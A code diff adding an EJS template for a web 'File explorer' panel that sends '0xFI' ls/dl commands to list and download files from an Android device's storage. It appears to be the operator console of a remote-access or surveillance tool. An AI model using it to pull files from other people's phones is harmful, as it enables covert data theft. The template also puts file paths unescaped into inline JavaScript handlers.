@@ -1,0 +1,132 @@
+<div class="ui segment">
+    <div class="ui secondary menu">
+        <div class="right menu">
+            <button onclick="openDirectory(this, '/storage/emulated/0')" class="ui blue button dlop"> <i
+                    class="icon home"></i>Home</button>
+            <!-- Home = /storage/emulated/0 -->
+        </div>
+    </div>
+    <%
+        const fileStatus = pageData.status || {};
+        const fileItems = Array.isArray(pageData.items) ? pageData.items : [];
+    %>
+
+    <% if (fileStatus.lastError) { %>
+        <div class="ui negative message">
+            <div class="header">File explorer error</div>
+            <p><%= fileStatus.lastError %></p>
+            <% if (fileStatus.lastError && fileStatus.lastError.indexOf('permission') !== -1) { %>
+                <p class="ui small text">Android 11+ requires the MANAGE_EXTERNAL_STORAGE permission. Prompt the user to grant "All files access" in settings, then retry.</p>
+            <% } %>
+        </div>
+    <% } %>
+
+    <% if (fileStatus.lastUpdated) { %>
+        <div class="ui tiny grey message">
+            <i class="history icon"></i>
+            Last updated: <%= new Date(fileStatus.lastUpdated).toLocaleString('en-GB', { timeZone: 'UTC' }) %>
+            <% if (fileStatus.lastPath) { %>
+                &mdash; Path: <code><%= fileStatus.lastPath %></code>
+            <% } %>
+        </div>
+    <% } %>
+
+    <table class="ui celled table">
+        <thead>
+            <tr>
+                <th style="text-align: center" colspan="2">Files</th>
+            </tr>
+        </thead>
+        <tbody>
+            <% if (!fileItems.length) { %>
+                <tr>
+                    <td colspan="2">
+                        <div class="ui placeholder segment">
+                            <div class="ui icon header">
+                                <i class="folder open outline icon"></i>
+                                No directory listing cached yet.
+                            </div>
+                            <p class="ui small text">Use the Home button or enter a path once storage permissions are granted on the device.</p>
+                        </div>
+                    </td>
+                </tr>
+            <% } else { %>
+                <% fileItems.forEach((item) => { %>
+                <tr>
+                    <td title="<%= item.path %>"><%= item.name %></td>
+                    <td class="collapsing">
+                        <% if(!item.isDir) { %>
+                        <button class="ui button dlop" onclick="downloadFile(this, '<%= item.path %>')">&nbsp;&nbsp;&nbsp;<i
+                                class="icon download blue"></i></button>
+                        <% } else { %>
+                        <button class="ui button dlop"
+                            onclick="openDirectory(this, '<%= item.path %>')">&nbsp;&nbsp;&nbsp;<i
+                                class="icon folder open grey"></i></button>
+                        <% } %>
+                    </td>
+                </tr>
+                <% }) %>
+            <% } %>
+        </tbody>
+    </table>
+
+    <script>
+
+        function openDirectory(element, path) {
+            $(element).children().css("opacity", "0");
+            $(element).addClass('blue');
+            $(element).addClass('loading');
+            $('.dlop').addClass('disabled');
+            sendCommand('0xFI', {
+                action: 'ls',
+                path
+            }, (error, message) => {
+                if (error) {
+                    setTimeout(() => {
+                        showNotification('#f03434', error)
+                        $(element).children().css("opacity", "1");
+                        $(element).removeClass('blue');
+                        $('.dlop').removeClass('loading')
+                    }, 300)
+                } else {
+                    if (message === 'Requested') {
+                        showNotification('#2ecc71', 'Requesting Files, Please Wait');
+                        setTimeout(() => {
+                            location.reload();
+                        }, 500)
+                    }
+                }
+            })
+        }
+
+        function downloadFile(element, path) {
+            $(element).children().css("opacity", "0");
+            $(element).addClass('green');
+            $(element).addClass('loading');
+            $('.dlop').addClass('disabled');
+            sendCommand('0xFI', {
+                action: 'dl',
+                path
+            }, (error, message) => {
+                if (error) {
+                    setTimeout(() => {
+                        showNotification('#f03434', error)
+                        $(element).children().css("opacity", "1");
+                        $(element).removeClass('green');
+                        $('.dlop').removeClass('disabled')
+                    }, 300)
+                } else {
+                    if (message === 'Requested') {
+                        setTimeout(() => {
+                            $(element).children().css("opacity", "1");
+                            $(element).removeClass('green');
+                            $(element).removeClass('loading');
+                            $('.dlop').removeClass('disabled')
+                            showNotification('#2ecc71', 'Downloading File, It will be avaliable in `Downloads` Soon');
+                        }, 300)
+                    }
+                }
+            })
+        }
+    </script>
+</div>
